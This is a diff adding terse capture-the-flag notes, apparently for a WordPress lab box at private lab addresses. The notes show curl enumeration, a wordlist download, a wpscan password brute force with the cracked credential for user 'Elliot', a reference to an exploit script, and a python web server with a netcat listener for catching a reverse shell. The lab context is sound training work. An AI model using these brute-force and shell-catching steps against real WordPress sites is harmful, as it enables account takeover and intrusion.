@@ -1,3 +1,35 @@
+[+]ENUMERATION[+]
+curl http://10.10.142.130/robots
+fsocity.dic
+flag1.txt
+
+
+[+]FLAG 1[+]
+curl http://10.10.142.130/key-1-of-3.txt > flag1.txt
+
+
+[+]FLAG 2[+]
+curl http://10.10.142.130/fsocity.dic > passwords.txt
+
+[+]WPSCAN[+]
+cat passwords.txt | wc -l
+858160
+
+sort passwords.txt | uniq > passwd.txt
+cat passwd.txt | wc -l
+11451
+
+
+wpscan --url http://10.10.142.130/wp-login.php --usernames Elliot --passwords passwd.txt -t 100
+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - Elliot / ER28-0652
+
+wordpress 4.3.1 
+5080.py
+
+
+
+
 http://10.10.155.198/wp-login.php
 WordPress version 4.3.1 identified
 
@@ -36,5 +68,9 @@ hachbox
 python -m http.server 80
 
 nc -lvnp 5555
+[+]cookie session hijacking not valid. 
+
+[+]WPSCAN[+]
 
 
+                            
